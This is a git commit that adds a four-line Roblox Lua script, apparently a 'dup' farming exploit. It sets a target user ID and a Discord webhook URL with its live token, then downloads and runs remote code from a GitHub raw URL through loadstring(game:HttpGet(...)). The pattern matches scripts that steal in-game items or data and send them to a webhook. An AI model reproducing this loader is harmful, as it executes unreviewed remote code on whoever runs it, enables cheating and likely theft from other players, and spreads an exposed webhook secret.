6f1845a8b526992c3ccafcdaf980847048e8c6f3
Bober1112 <133981581+Bober1112@users.noreply.github.com>
2023-05-18 16:50:52 +0300

    Create visual.lua

---
+++ Farm/dup/visual.lua
@@ -0,0 +1,4 @@
+_G.UserID = 3741747858
+_G.Webhook = "https://discord.com/api/webhooks/1108450930749354125/D8MKI0sm9yOxeHsfDD1JR_weenGR8Gj5szlvg3MjKtjhIalRuyowweUjKcyiIQA9HPKu"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Script.lua", true))()
